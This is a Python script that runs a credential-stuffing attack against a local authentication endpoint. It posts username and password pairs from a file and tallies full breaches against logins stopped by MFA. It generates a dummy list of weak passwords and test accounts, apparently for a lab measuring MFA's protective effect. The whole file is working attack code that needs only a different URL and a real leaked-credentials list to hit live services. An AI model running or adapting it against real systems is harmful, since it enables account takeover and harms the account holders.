import requests

BASE_URL = "http://127.0.0.1:8001/auth"

def run_credential_stuffing(credentials_file):
    results = {
        "attempts": 0,
        "success_no_mfa": 0, # Full breach
        "success_mfa_blocked": 0, # Password correct, but MFA stopped it
        "failed": 0
    }
    
    with open(credentials_file, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or ':' not in line: continue
            
            username, password = line.split(':', 1)
            results["attempts"] += 1
            
            try:
                resp = requests.post(f"{BASE_URL}/token", data={"username": username, "password": password})
                
                if resp.status_code == 200:
                    data = resp.json()
                    if "access_token" in data:
                        print(f"[BREACH] {username}: Access Token Retrieved!")
                        results["success_no_mfa"] += 1
                    elif data.get("mfa_required"):
                        print(f"[BLOCKED] {username}: Password Correct, MFA Challenge Received ({data['mfa_type']})")
                        results["success_mfa_blocked"] += 1
                else:
                    # print(f"[FAIL] {username}: {resp.status_code}")
                    results["failed"] += 1
                    
            except Exception as e:
                print(f"Error checking {username}: {e}")
                
    return results

if __name__ == "__main__":
    # Create a dummy credentials list for testing
    dummy_creds = "credentials_dump.txt"
    with open(dummy_creds, "w") as f:
        passwords = ["123456", "password", "12345678", "qwerty", "1234567890", "wrongpass"]
        # Stuff correct users
        for i in range(5):
            f.write(f"user_pwd_{i}:{passwords[i]}\n")
            f.write(f"user_sms_{i}:{passwords[i]}\n")
            f.write(f"user_totp_{i}:{passwords[i]}\n")
            f.write(f"user_quest_{i}:{passwords[i]}\n")
        # Add some garbage
        f.write("admin:admin\n")
        f.write("root:toor\n")

    print("Running Attack...")
    stats = run_credential_stuffing(dummy_creds)
    print("\n--- ATTACK REPORT ---")
    print(stats)
